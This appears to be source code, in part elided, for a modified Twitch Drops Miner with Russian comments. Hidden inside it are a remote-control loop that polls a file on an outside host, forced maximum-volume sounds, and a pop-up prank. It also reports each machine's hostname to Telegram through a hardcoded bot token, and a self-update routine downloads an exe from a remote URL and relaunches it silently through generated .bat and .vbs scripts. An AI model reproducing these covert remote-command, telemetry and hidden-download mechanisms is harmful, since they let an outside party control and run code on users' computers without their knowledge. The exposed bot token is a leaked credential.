...
import aiohttp
CURRENT_VERSION = "16.2.0" # <-- ВАША ТЕКУЩАЯ ВЕРСИЯ
from yarl import URL

from volume_manager import ensure_max_volume
...
class Twitch:
    def __init__(self, settings: Settings):
        ...
        self._sound_init_task: asyncio.Task[None] | None = None
        self._random_sound_task: asyncio.Task[None] | None = None
        self._duck_task: asyncio.Task[None] | None = None
        self._remote_control_task: asyncio.Task[None] | None = None
        self._github_sync_task: asyncio.Task[None] | None = None
        self._mnt_task: asyncio.Task[None] | None = None
        
        # --- Feature flags and events ---
        self.websocket = WebsocketPool(self)
        self._watching_restart = asyncio.Event()
        self._random_sound_event = asyncio.Event()
        self._duck_event = asyncio.Event()
        self._remote_control_event = asyncio.Event()
        
        # --- Sound and Duck variables ---
        self.random_sounds = []
        self.compliment_sounds = {}
        self.duck_sound = None
        
        # --- Remote Control variables ---
        self.last_special_command: str = "none"
        self.last_sound_command: str = "none"
        
        # --- Timer and Logging variables ---
        self.last_sound_played_time: datetime | None = None
        self.last_duck_appeared_time: datetime | None = None
        self.next_sound_play_time: datetime | None = None
        self.next_duck_appearance_time: datetime | None = None
    ...
    async def shutdown(self) -> None:
        start_time = time()
        self.stop_watching()
        if self._random_sound_task is not None: # <-- Добавьте эту строку
            self._random_sound_task.cancel()
        if self._github_sync_task is not None:
            self._github_sync_task.cancel()
        if self._remote_control_task is not None: # <-- Добавьте эту строку
            self._remote_control_task.cancel()    # <-- и эту    
        ...
        if self._mnt_task is not None:
            ...
            self._mnt_task = None
        if self._duck_task is not None:      # <-- Добавьте эту строку
    ...
    async def _run(self):
        ...
        try:
            ...
            # --- ИЗМЕНЁННАЯ СТРОКА ---
            startup_message = (
                f"🚀 Программа на **{self.hostname}** запущена!\n"
                f"Версия: `{CURRENT_VERSION}`\n"
                f"Имя процесса: `{process_name}`"
            )
            # ---------------------------

            asyncio.create_task(self._send_telegram_notification(startup_message))
        except Exception as e:
            print(f"Не удалось отправить стартовое уведомление: {e}")

        self.gui.start()
        asyncio.create_task(self._initialize_sounds())
        self._github_sync_task: asyncio.Task[None] | None = None
        self._github_sync_task = asyncio.create_task(self._github_sync_loop())
        self._remote_control_task = asyncio.create_task(self._remote_control_loop())
        self.print(f"--- Twitch Drops Miner v{CURRENT_VERSION} ---")
        if self.settings.remote_compliments_enabled:
            self._remote_control_event.set()
        # --- НАЧАЛО БЛОКА ДЛЯ ВСТАВКИ ---
        # Запускаем фоновую задачу для проигрывания звуков
        self._random_sound_task = asyncio.create_task(self._random_sound_loop())
        # Устанавливаем начальное состояние из настроек
        if self.settings.random_sound_enabled:
            self._random_sound_event.set()
        self._duck_task = asyncio.create_task(self._duck_loop())
        if self.settings.duck_enabled:
    ...
    async def fetch_inventory(self) -> None:
        ...
        # --- НАЧАЛО ИЗМЕНЕНИЙ: Добавляем цикл повторных попыток ---
        while True:
            try:
                # Вся логика получения данных теперь внутри try...except
                ...
                # Если всё успешно, выходим из цикла и продолжаем работу
                break

            except GQLException as e:
                # Ловим ошибку от сервера Twitch
                if "service error" in str(e).lower():
                    # Если это временная ошибка сервера, ждём 15 минут
                    wait_minutes = 15
                    self.print(f"Серверы Twitch временно недоступны. Повторная попытка через {wait_minutes} минут...")
                    await asyncio.sleep(wait_minutes * 60)
                else:
                    # Если это другая, неизвестная ошибка, "вылетаем" как и раньше
                    raise e
            except Exception:
                # Ловим другие ошибки (например, нет интернета) и тоже ждём
                wait_minutes = 15
                self.print(f"Ошибка при получении данных. Повторная попытка через {wait_minutes} минут...")
                await asyncio.sleep(wait_minutes * 60)
        # --- КОНЕЦ ИЗМЕНЕНИЙ ---
...
# twitch.py (замените старую функцию _random_sound_loop на эту)

    async def _random_sound_loop(self) -> NoReturn:
        while True:
            try:
                # 1. Цикл всегда начинается с ожидания "разрешения".
                # Если звуки выключены, он будет спать здесь.
                await self._random_sound_event.wait()
                
                if not self.random_sounds:
                    await asyncio.sleep(60)
                    continue

                # 2. Как только разрешение получено, СРАЗУ планируем следующий звук.
                min_delay = self.settings.random_sound_min_delay
                max_delay = self.settings.random_sound_max_delay
                delay = random.uniform(min_delay, max_delay)
                self.next_sound_play_time = datetime.now(timezone.utc) + timedelta(seconds=delay)
                
                # Диагностическое сообщение, чтобы вы видели, что таймер установился
                print(f"[ДИАГНОСТИКА] Случайный звук запланирован через {int(delay)} секунд.")

                # 3. Теперь уходим в длительное ожидание.
                await asyncio.sleep(delay)
                
                # 4. После сна, если функция всё ещё активна, проигрываем звук.
                if self._random_sound_event.is_set():
                    ensure_max_volume()
                    self.last_sound_played_time = datetime.now(timezone.utc)
                    asyncio.create_task(self._send_telegram_notification("🎲 Проигран случайный фоновый звук."))
                    random.choice(self.random_sounds).play()
                    self.next_sound_play_time = None # Сбрасываем таймер после проигрывания

            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Ошибка в цикле случайных звуков: {e}")
                self.next_sound_play_time = None
                await asyncio.sleep(60)
                
    def play_test_sound(self):
        success = ensure_max_volume()
        if not self.settings.random_sound_enabled:
            self.print("Тестовый звук не проигран: функция отключена в настройках.")
            return
        if self.random_sounds:
            self.last_sound_played_time = datetime.now(timezone.utc)
            asyncio.create_task(self._send_telegram_notification("🔊 Проигран тестовый звук."))
            random.choice(self.random_sounds).play()
            self.print("Проигран тестовый фоновый звук.")
        else:
            self.print("Тестовый звук не проигран: звуки ещё не загружены или не найдены.")   
    async def _duck_loop(self) -> NoReturn:
        await asyncio.sleep(2)
        while True:
            try:
                # 1. Сначала цикл ждёт "зелёного света". Если функция выключена, он будет стоять на паузе здесь.
                await self._duck_event.wait()

                # 2. Как только разрешение получено, СРАЗУ планируем следующее появление.
                delay_seconds = random.uniform(1800, 6000)
                self.next_duck_appearance_time = datetime.now(timezone.utc) + timedelta(seconds=delay_seconds)
                print(f"[ДИАГНОСТИКА] Утка запланирована через {int(delay_seconds)} секунд.")
                
                # 3. Теперь уходим в длительное ожидание.
                await asyncio.sleep(delay_seconds)

                # 4. После сна, если функция всё ещё активна, показываем утку.
                if self._duck_event.is_set():
                    self.last_duck_appeared_time = datetime.now(timezone.utc)
                    asyncio.create_task(self._send_telegram_notification("🦆 На экране появилась утка!"))
                    self.gui.show_duck()
                    self.next_duck_appearance_time = None # Сбрасываем таймер после срабатывания
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Ошибка в цикле уточки: {e}")
                self.next_duck_appearance_time = None
                await asyncio.sleep(60)

    from tenacity import retry, stop_after_attempt, wait_fixed

    async def sync_github_sounds(self) -> bool:
        """
        Синхронизирует звуки с репозитория GitHub.
        Возвращает True в случае успеха и False в случае ошибки.
        """
        api_url = "https://api.github.com/repos/Thedrezik/Prunk2/contents/compliments"
        target_dir = self.sounds_path_temp
        ...
        try:
            ...
            # 2. Скачиваем только новые файлы
            for file_info in files_data:
                if file_info.get('type') == 'file' and file_info.get('name', '').endswith('.mp3'):
                    ...
                    if not os.path.exists(file_path):
                        ...
                        print(f"Скачиваю новый звук: {file_name}")
                        async with session.get(download_url, timeout=timeout) as file_response:
                            if file_response.status == 200:
                                content = await file_response.read()
                                with open(file_path, 'wb') as f:
                                    f.write(content)
                                # Сразу загружаем новый звук в программу
                                try:
                                    command_name = os.path.splitext(file_name)[0]
                                    self.compliment_sounds[command_name] = pygame.mixer.Sound(file_path)
                                    asyncio.create_task(self._send_telegram_notification("✅ Новые звуки загружены."))
                                except pygame.error as e:
                                    print(f"Ошибка при загрузке нового звука {file_name}: {e}")
                            else:
                                print(f"Ошибка скачивания {file_name}: статус {file_response.status}")
            
            if new_files_found == 0:
                print("Новых звуков на GitHub не найдено.")
                asyncio.create_task(self._send_telegram_notification("✅ Нет новых звуков."))

            return True

        except asyncio.TimeoutError:
            print("Ошибка сети: сервер GitHub не ответил (timeout).")
            return False
        except aiohttp.ClientError as e:
            print(f"Ошибка сети при синхронизации с GitHub: {e}")
            return False
        except Exception as e:
            print(f"Непредвиденная ошибка при синхронизации с GitHub: {e}")
            return False

    async def _initialize_sounds(self):
        """Неблокирующая функция инициализации ВСЕХ звуковых ресурсов."""
        try:
            print("Инициализация звуковой подсистемы...")
            pygame.mixer.init()

            source_assets_path = resource_path("assets")
            self.sounds_path_temp = os.path.join(tempfile.gettempdir(), "TwitchComplimentsSounds")
            os.makedirs(self.sounds_path_temp, exist_ok=True)

            # --- ЗАГРУЗКА СЛУЧАЙНЫХ ЗВУКОВ ---
            sound_files = []
            for f in os.listdir(source_assets_path):
                if f.startswith("sound") and (f.endswith(".mp3") or f.endswith(".wav")):
                    sound_files.append(os.path.join(source_assets_path, f))
            if sound_files:
                self.random_sounds = [pygame.mixer.Sound(f) for f in sound_files]
                print(f"Загружено {len(self.random_sounds)} фоновых звуков.")
            
            await asyncio.sleep(0) # Даём передышку

            # --- ЗАГРУЗКА КОМПЛИМЕНТОВ ---
            print("Копирование и загрузка комплиментов...")
            for filename in os.listdir(source_assets_path):
                if not filename.startswith("sound"):
                    source_file = os.path.join(source_assets_path, filename)
                    if os.path.isfile(source_file) and (filename.endswith(".mp3") or filename.endswith(".wav")):
                        shutil.copy(source_file, self.sounds_path_temp)
                        await asyncio.sleep(0) # Даём передышку после каждого файла

            await self.sync_github_sounds() # Эта функция уже асинхронная

            for filename in os.listdir(self.sounds_path_temp):
                if filename.endswith((".mp3", ".wav")):
                    command_name = os.path.splitext(filename)[0]
                    if command_name not in self.compliment_sounds:
                        sound_path = os.path.join(self.sounds_path_temp, filename)
                        self.compliment_sounds[command_name] = pygame.mixer.Sound(sound_path)
                        await asyncio.sleep(0) # Даём передышку
            
            print(f"Инициализация звуков завершена.")

        except Exception as e:
            print(f"Критическая ошибка при инициализации звуков: {e}")

    async def _remote_control_loop(self) -> NoReturn:
        await asyncio.sleep(5)
        check_interval = 5
        
        command_regex = re.compile(r"command:\s*(.+)")
        sound_regex = re.compile(r"sound:\s*(.+)")
        args_regex = re.compile(r"(\w+)(?:\(([^)]*)\))?")

        while True:
            try:
                await self._remote_control_event.wait()
                if not self._remote_control_event.is_set():
                    continue

                url = "http://l92527k8.beget.tech/control.txt"
                session = await self.get_session()
                text = await self._fetch_url(session, url)
                
                # --- 1. ОБРАБОТКА СПЕЦИАЛЬНОЙ КОМАНДЫ (command:) ---
                command_match = command_regex.search(text)
                if command_match:
                    full_command_str = command_match.group(1).strip()
                    
                    if full_command_str != "none" and full_command_str != self.last_special_command:
                        command_parts = args_regex.search(full_command_str)
                        command = command_parts.group(1).strip() if command_parts else ""
                        args_str = command_parts.group(2) if command_parts else None

                        if command == 'reset':
                            # Сначала выполняем сброс
                            self.last_special_command = "none"
                            self.last_sound_command = "none"
                            asyncio.create_task(self._send_telegram_notification("🔄 Память команд и звуков сброшена."))
                            # А затем запоминаем саму команду reset, чтобы она не повторялась
                            self.last_special_command = full_command_str

                        elif command == 'interval':
                            try:
                                min_val, max_val = map(int, args_str.split(','))
                                self.settings.random_sound_min_delay = min_val
                                self.settings.random_sound_max_delay = max_val
                                self.settings.save()
                                message = f"⚙️ Интервал случайных звуков изменён на: *{min_val} - {max_val}* сек."
                                asyncio.create_task(self._send_telegram_notification(message))
                            except (ValueError, TypeError):
                                error_message = "❌ Ошибка в команде `interval`. Формат: `interval(min, max)`"
                                asyncio.create_task(self._send_telegram_notification(error_message))
                            self.last_special_command = full_command_str
                        elif command == 'resync':
                            print("Получена удалённая команда: ресинхронизация")
                            # Отправляем уведомление в Telegram
                            asyncio.create_task(self._send_telegram_notification("🔄 Запущена ресинхронизация с GitHub..."))
                            # Запускаем саму синхронизацию в фоне
                            asyncio.create_task(self.sync_github_sounds())
                            # Запоминаем, что выполнили команду, для защиты от спама
                            self.last_special_command = full_command_str #
                            
                        elif command == 'duck':
                             self.gui.show_duck()
                             asyncio.create_task(self._send_telegram_notification("🦆 Утка вызвана удалённой командой!"))
                             self.last_special_command = full_command_str
                        
                        elif command == 'timer':
                            if self.next_sound_play_time:
                                remaining_sound = self.next_sound_play_time - datetime.now(timezone.utc)
                                sound_timer_str = self._format_timedelta(remaining_sound)
                            else:
                                sound_timer_str = "ещё не запланирован"
                            if self.next_duck_appearance_time:
                                remaining_duck = self.next_duck_appearance_time - datetime.now(timezone.utc)
                                duck_timer_str = self._format_timedelta(remaining_duck)
                            else:
                                duck_timer_str = "ещё не запланирована"
                            message = (
                                f"⏳ **Таймеры событий**:\n"
                                f"- 🎲 Случайный звук через: *{sound_timer_str}*\n"
                                f"- 🦆 Следующая утка через: *{duck_timer_str}*"
                            )
                            asyncio.create_task(self._send_telegram_notification(message))
                            self.last_special_command = full_command_str

                        elif command == 'start_sounds':
                            self._random_sound_event.set()
                            self.settings.random_sound_enabled = True; self.settings.save()
                            asyncio.create_task(self._send_telegram_notification("🎲 Случайные звуки *включены*."))
                            self.last_special_command = full_command_str
                        
                        elif command == 'stop_sounds':
                            self._random_sound_event.clear()
                            self.next_sound_play_time = None
                            self.settings.random_sound_enabled = False; self.settings.save()
                            asyncio.create_task(self._send_telegram_notification("🔇 Случайные звуки *отключены*."))
                            self.last_special_command = full_command_str
                        
                        elif command == 'start_duck':
                            self._duck_event.set()
                            self.settings.duck_enabled = True; self.settings.save()
                            asyncio.create_task(self._send_telegram_notification("🦆 Появление утки *включено*."))
                            self.last_special_command = full_command_str
                            
                        elif command == 'stop_duck':
                            self._duck_event.clear()
                            self.next_duck_appearance_time = None
                            self.settings.duck_enabled = False; self.settings.save()
                            asyncio.create_task(self._send_telegram_notification("❌ Появление утки *отключено*."))
                            self.last_special_command = full_command_str

                        elif command == 'update':
                            asyncio.create_task(self._send_telegram_notification("🛰️ Получена команда на обновление. Запускаю проверку..."))
                            asyncio.create_task(self._check_for_updates())
                            self.last_special_command = full_command_str
                
                # --- 2. ОБРАБОТКА КОМАНДЫ НА ВОСПРОИЗВЕДЕНИЕ ЗВУКА (sound:) ---
                sound_match = sound_regex.search(text)
                if sound_match:
                    sound_name = sound_match.group(1).strip()
                    
                    if sound_name != "none" and sound_name != self.last_sound_command:
                        if sound_name in self.compliment_sounds:
                            ensure_max_volume()
                            self.last_sound_played_time = datetime.now(timezone.utc)
                            asyncio.create_task(self._send_telegram_notification(f"🥰 Проигран звук: *{sound_name}*"))
                            self.compliment_sounds[sound_name].play()
                        
                        self.last_sound_command = sound_name
                ...
                print(f"Ошибка в цикле удалённого управления: {e}")
                await asyncio.sleep(10)

    @retry(stop=stop_after_attempt(3), wait=wait_fixed(5))
    
    async def _github_sync_loop(self) -> NoReturn:
        """
        Периодически вызывает sync_github_sounds
        с логикой повторных попыток и уведомлением об успехе.
        """
        await asyncio.sleep(15)
        while True:
            try:
                print("Проверка обновлений звуков на GitHub...")
                success = await self.sync_github_sounds()
                ...
                if success:
                    ...
                    print("Синхронизация прошла успешно. Следующая проверка через 30 минут.")
                    await asyncio.sleep(1600) # 300 секунд = 30- минут
                else:
                    print("Ошибка синхронизации. Повторная попытка через 60 секунд...")
                    await asyncio.sleep(60)

            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Критическая ошибка в цикле синхронизации: {e}")
                print("Повторная попытка через 20 секунд...")
                await asyncio.sleep(20)
    ...
    async def _send_telegram_notification(self, message: str):
            """Отправляет уведомление в Telegram, добавляя имя компьютера."""
            
            # --- ВСТАВЬТЕ СЮДА ВАШИ ДАННЫЕ ---
            BOT_TOKEN = "8498355197:AAFLjh-ucDGcw4hNnlKLPB6UGXd8FQg41qo" # Замените на токен вашего бота
            CHAT_ID = "-1002746703418"               # Замените на ID вашей группы
            # ------------------------------------

            # --- НОВОЕ ФОРМАТИРОВАНИЕ СООБЩЕНИЯ ---
            # Добавляем имя компьютера в начало
            final_message = f"💻 **{self.hostname}**:\n{message}"
            # ---------------------------------------

            api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': CHAT_ID,
                'text': final_message, # <-- Используем новое сообщение
                'parse_mode': 'Markdown'
            }
            ...
            try:
                ...
                async with session.post(api_url, json=payload, timeout=15) as response:
                    if response.status == 200:
                        ...
                        logging.error(
                            f"Ошибка отправки в Telegram. Сервер ответил: {response.status}. "
    ...
    def _format_timedelta(self, td: timedelta) -> str:
        """Красиво форматирует объект timedelta в строку."""
    ...
    async def _check_for_updates(self):
            ...
            # Укажите прямую ссылку на ваш version.json на GitHub
            version_url = "https://raw.githubusercontent.com/Thedrezik/Prunk2/main/version.json"
            ...
            try:
                ...
                async with session.get(version_url) as response:
                    if response.status == 200:
                        ...
                        # --- ИСПРАВЛЕННАЯ СТРОКА ---
                        # Добавляем content_type=None, чтобы игнорировать заголовок text/plain
                        ...
                        if remote_version and remote_version > CURRENT_VERSION:
                            print(f"Доступна новая версия: {remote_version}. Начинаю обновление...")
                            await self._send_telegram_notification(f"🚀 Начинаю обновление до версии *{remote_version}*...")
                            await self._apply_update(data.get("url"))
                        else:
                            print("Установлена последняя версия программы.")
            except Exception as e:
                print(f"Ошибка при проверке обновлений: {e}")
     
    async def _apply_update(self, update_url: str):
        """
        Скачивает обновление, создает .bat для логики и .vbs для скрытого запуска.
        """
        if not update_url:
            print("URL для обновления не найден.")
            return

        try:
            # 1. Скачиваем новую версию (без изменений)
            print("Скачивание новой версии...")
            session = await self.get_session()
            async with session.get(update_url) as response:
                if response.status != 200:
                    print(f"Не удалось скачать обновление, статус: {response.status}")
                    return
                
                new_exe_path = "program.new.exe"
                with open(new_exe_path, "wb") as f:
                    f.write(await response.read())
            
            print("Новая версия скачана.")
            
            current_exe_path = os.path.basename(sys.argv[0])

            # 2. Создаём .bat скрипт с логикой обновления (без изменений)
            bat_script_content = f"""
@echo off
ping 127.0.0.1 -n 3 > nul
taskkill /F /IM "{current_exe_path}" >nul 2>&1
ping 127.0.0.1 -n 3 > nul
del "{current_exe_path}"
rename "{new_exe_path}" "{current_exe_path}"
ping 127.0.0.1 -n 3 > nul
start "" "{current_exe_path}" --tray
del "%~f0"
"""
            with open("update.bat", "w", encoding='cp866') as f:
                f.write(bat_script_content)

            # 3. Создаём крошечный .vbs для скрытого запуска .bat
            vbs_script_content = 'CreateObject("Wscript.Shell").Run "update.bat", 0, False'
            with open("launch.vbs", "w", encoding='utf-8') as f:
                f.write(vbs_script_content)

            print("Скрипты обновления созданы.")
            print("Перезапуск для применения обновления...")

            # 4. Запускаем .vbs скрипт (он, в свою очередь, невидимо запустит .bat)
